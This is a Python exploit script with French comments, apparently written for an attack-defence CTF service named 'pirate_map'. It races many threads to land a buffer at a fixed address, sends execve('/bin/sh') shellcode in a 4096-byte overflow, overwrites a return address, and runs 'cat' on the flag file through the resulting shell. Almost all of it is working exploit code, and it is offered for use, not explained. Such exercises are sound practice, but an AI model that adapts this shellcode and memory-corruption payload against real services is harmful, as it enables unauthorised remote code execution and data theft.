#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, socket
import time
import threading

if len(sys.argv) != 3 :
    print("Exploit du service pirate_map\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20038

lock = threading.Lock()

# 20 threads c'est rapide, mais à l'échelle du CTF il y a 35 machines à attaquer par tick... 35*20 = 700 threads tout de même
# On privilégie la rapidité pour cet exploit, même si il est plus judicieux de vraiment limiter le nombre de threads en situation réelle
number_of_threads = 20

def add_entry(s) :
  s.send('1\n')
  time.sleep(0.1)
  entry_ack = s.recv(1024)
  return entry_ack.split()[3]

def remove_entry(s) :
  s.send('2\n')
  time.sleep(0.1)
  entry_ack = s.recv(1024)

# Un shellcode sur la première page de exploit-db... execve("/bin/sh", 0, 0)
shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"   



# On utilise le multithreading pour aller plus vite, parce qu'on n'a qu'une chance sur 256 d'avoir l'adresse 0x30000 à chaque essai...
# Le premier thread à obtenir le flag renvoie le flag et ferme le programme (et donc tous les threads)
class GetAddressThread(threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)
    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.lock = lock

  def run(self) :
    self.s.connect((host,port))
    try :
      buffer_addr = add_entry(self.s)

      while buffer_addr != "00030000" :
        remove_entry(self.s)
        buffer_addr = add_entry(self.s)

# Lock : Le premier thread a obtenir le flag affiche seul le résultat et ferme le programme violemment avec os._exit()... (codé à l'arrache)

      self.lock.acquire()
      self.s.send('3\n')
      time.sleep(0.1)
      write_ack = self.s.recv(1024)

      self.s.send(shellcode + 'A'*(4096-len(shellcode)) + "EXPLOIT_ME\n")
      time.sleep(0.1)
      overflow_ack = self.s.recv(1024)

      self.s.send('4\n')
      time.sleep(0.1)
      trigger_bug_ack = self.s.recv(1024)

      self.s.send('A'*12 + '\xac\xa6\x04\x08\x0a')
      time.sleep(0.1)

      self.s.send('cat ' + target + '; exit\n')
      time.sleep(0.1)
      flag_ack = self.s.recv(4096)
      if len(flag_ack) != 0 :
        flag = flag_ack.split()[0]
        print(flag)
      else :
        print("Flag not found")
      
      os._exit(1)

    except socket.error:
      print("Erreur lors de l'envoi")
      sys.exit()


for i in range(1,number_of_threads):
  thread = GetAddressThread()
  thread.start()
